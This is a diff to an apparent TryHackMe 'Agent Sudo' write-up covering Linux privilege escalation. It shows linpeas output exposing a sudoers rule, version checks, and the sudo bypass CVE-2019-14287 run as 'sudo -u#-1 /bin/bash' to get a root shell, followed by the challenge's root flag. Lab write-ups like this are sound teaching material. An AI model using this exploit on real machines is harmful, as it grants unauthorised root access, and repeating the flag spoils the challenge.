@@ -306,8 +306,74 @@ Roswell alien autopsy
 
 ### CVE number for the escalation 
 
+run linpeas and we get some interesting results
 
+```
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                                                 
+Matching Defaults entries for james on agent-sudo:                                                                                                                                   
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+
+[+] Checking /etc/doas.conf
+/etc/doas.conf Not Found                                                                                                                                                             
+                                                                                                                                                                                     
+[+] Checking Pkexec policy
+                                                                                                                                                                                     
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo;unix-group:admin
+```
+check the version of bash and sudo
+
+```
+james@agent-sudo:~$ bash --version
+GNU bash, version 4.4.20(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+james@agent-sudo:~$ sudo --version
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+```
+
+use searchsploit to check if any of these versions are vulnerable 
+
+we find this exploit (it works on a higher version, so it should work with this version)
+
+```
+sudo 1.8.27 - Security Bypass
+```
+answer
+```
+cve-2019-14287 
+```
 
 ### What is the root flag?
+
+run the exploit then get the flag
+```
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+[sudo] password for james: 
+root@agent-sudo:~# cd /root
+root@agent-sudo:/root# ls
+root.txt
+root@agent-sudo:/root# cat root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+```
 
 ### (Bonus) Who is Agent R?
